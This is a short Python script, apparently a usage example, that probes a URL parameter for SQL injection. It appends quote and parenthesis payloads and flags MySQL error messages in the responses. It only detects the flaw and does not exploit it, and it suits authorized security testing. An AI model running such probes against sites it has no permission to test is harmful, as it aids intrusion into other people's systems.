import requests
import re

def sqli_scan(url):
    payloads = ["'", '"', ')', '))', '%27', '%22', '%29', '%2527', '%2522', '%2529']
    for payload in payloads:
        r = requests.get(url + payload)
        if re.search(r"SQL syntax.*MySQL", r.text):
            print(f"[+] Vulnerable to SQL injection with payload: {payload}")
        elif re.search(r"You have an error in your SQL syntax", r.text):
            print(f"[+] Vulnerable to SQL injection with payload: {payload}")
        else:
            print(f"[-] Not vulnerable with payload: {payload}")

# Ejemplo de uso
url = 'https://www.example.com/page.php?id='
sqli_scan(url)
